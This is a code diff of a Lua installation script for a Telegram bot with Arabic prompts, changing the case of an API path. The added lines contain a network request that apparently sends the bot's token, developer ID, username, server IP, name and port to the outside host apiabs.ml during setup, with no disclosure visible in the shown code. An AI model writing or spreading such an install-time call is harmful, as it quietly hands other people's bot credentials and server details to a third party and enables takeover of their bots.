@@ -25,7 +25,7 @@ if not DevRio:get(Server.."IdRinda") then
 io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
 local DevId = io.read():gsub(' ','') 
 if tostring(DevId):match('%d+') then 
-data,res = https.request("https://apiabs.ml/Api/Rinda/index.php?Ban=Rinda&Info&Id="..DevId)
+data,res = https.request("https://apiabs.ml/Api/RiNdA/index.php?Ban=RiNdA&Info&Id="..DevId)
 if res == 200 then
 Abs = json:decode(data)
 if Abs.Result.Info == 'Is_Spam' then
@@ -77,7 +77,7 @@ Rinda = DevRio:get(Server.."TokenRinda"):match("(%d+)"),
 SudoIds = {DevRio:get(Server.."IdRinda")},
 }
 Create(Config, "./config.lua") 
-https.request("https://apiabs.ml/Api/Rinda/index.php?Get=Rinda&DevId="..DevRio:get(Server.."IdRinda").."&TokenBot="..DevRio:get(Server.."TokenRinda").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
+https.request("https://apiabs.ml/Api/RiNdA/index.php?Get=RiNdA&DevId="..DevRio:get(Server.."IdRinda").."&TokenBot="..DevRio:get(Server.."TokenRinda").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
 file = io.open("Rinda.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
